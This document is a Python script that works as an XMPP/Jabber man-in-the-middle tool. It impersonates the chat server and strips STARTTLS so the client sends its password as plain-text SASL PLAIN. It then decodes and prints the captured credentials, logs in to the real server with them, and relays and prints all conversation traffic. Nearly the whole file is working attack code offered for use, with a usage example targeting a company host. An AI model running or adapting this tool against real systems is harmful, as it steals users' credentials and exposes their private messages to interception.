#!/usr/bin/env python

import sys, socket, thread, ssl, re, base64

HOST = '0.0.0.0'
PORT = 5222
BUFSIZE = 4096

'''
The Plan:
* Client connects, gives us server name
* We respond, tell it features=PLAIN
* Client gives us creds
* We connect to server, give server name
* Server sends us features=STARTTLS
* We do STARTTLS, send creds to server
* Tell client creds worked
* Relay!
'''

# Used to impersonate server
packet0 = '''<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='1234567890' from='%s' version='1.0' xml:lang='en'>'''
packet1 = '''<stream:features><mechanisms xmlns='urn:ietf:params:xml:ns:xmpp-sasl'><mechanism>PLAIN</mechanism></mechanisms><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='ZGVhZGJlZWZkZWFkYmVlZg=='/></stream:features>'''
# Used to impersonate client
packetA = '''<?xml version='1.0'?>'''
packetB = '''<stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0' to='%s'>'''
packetC = '''<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>'''
packetD = '''<auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' mechanism='PLAIN'>%s</auth>'''

def dotarget(clientsock,target,name,credblob):
	targetsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		print 'SERVER CONNECT to:', target
		targetsock.connect((target,PORT))
		
		# Send XML Header
		targetsock.send(packetA)
		
		# Send Name
		targetsock.send(packetB % name)
		
		# Receive Name==OK
		pkt = targetsock.recv(BUFSIZE)
		if pkt == '':
			raise Exception("Didn't receive hostname response")
			
		# Receive Features
		pkt = targetsock.recv(BUFSIZE)
		if pkt == '':
			raise Exception("Didn't receive features")
			
		# Send STARTTLS
		targetsock.send(packetC)
		
		# Receive STARTTLS==OK
		pkt = targetsock.recv(BUFSIZE)
		if 'proceed' not in pkt:
			print pkt
			raise Exception("Didn't receive STARTTLS <proceed>")
	except Exception as e:
		print "closing socket:", e
		targetsock.close()
		return
	print 'server connection is switching to TLS'
	try:
		sslsock = ssl.wrap_socket(targetsock,suppress_ragged_eofs=False)
		
		# Send XML Header
		sslsock.send(packetA)
		
		# Send Name
		sslsock.send(packetB % name)

		# Receive Name==OK
		pkt = sslsock.recv(BUFSIZE)
		if pkt == '':
			raise Exception("Didn't receive hostname response [TLS]")
		
		# Receive Features
		pkt = sslsock.recv(BUFSIZE)
		if pkt == '':
			raise Exception("Didn't receive features [TLS]")

		# Send Auth
		sslsock.send(packetD % credblob)
		
		# Receive Auth==OK
		pkt = sslsock.recv(BUFSIZE)
		if 'success' not in pkt:
			print "DEBUG, bad auth response: ",pkt
			raise Exception("Bad SASL negotiation or credentials [TLS]")
		
		# Send client Auth==OK
		clientsock.send(pkt)

		# Switch to relay mode
		sslsock.settimeout(1.0)		
		clientsock.settimeout(1.0)
		print 'RELAYING'
		while 1:
			try:
				p = clientsock.recv(BUFSIZE)
				print "C->S",p
				sslsock.send(p)
			except socket.error as e:
				if "timed out" not in str(e):
					raise e	
			try:
				p = sslsock.recv(BUFSIZE)
				print "S->C",p
				clientsock.send(p)
			except socket.error as e:
				if "timed out" not in str(e):
					raise e
	except Exception as e:
		print "closing SSL socket:", e
		sslsock.close()

def child(sock,target):
	try:
		# Receive XML Header
		req0 = sock.recv(BUFSIZE)
		
		# Receive Server Name
		req1 = sock.recv(BUFSIZE)
		m = re.search("to='([\w\.]+)'",req1)
		name = m.group(1)
		print 'hostname:', name
		
		# Send Name==OK
		sock.send(packet0 % name)
		
		# Send Features: no TLS & PLAIN auth
		sock.send(packet1)
		
		# Receive PLAIN auth
		authblock = sock.recv(BUFSIZE)
		if authblock != '':
			credblob = re.search('>(\w+)</auth>',authblock).group(1)
			creds = base64.b64decode(credblob).split('\x00')
			print "credentials:",creds
			dotarget(sock,target,name,credblob)
		else:
			print "Client doesn't like PLAIN or non-TLS"
		sock.close()
	except Exception as e:
		print "closing client socket:",e
		sock.close()

if __name__=='__main__': 
	if len(sys.argv) != 2:
		sys.exit('Usage: %s TARGETHOST\nExample: %s jabber.yourcompany.org' % sys.argv[0], sys.argv[0])
	target = sys.argv[1]
	myserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	myserver.bind((HOST, PORT))
	myserver.listen(2)
	print 'LISTENER ready on port', PORT
	try:
		while 1:
			client, addr = myserver.accept()
			print 'CLIENT CONNECT from:', addr
			thread.start_new_thread(child, (client,target))
	except KeyboardInterrupt:
		server.close()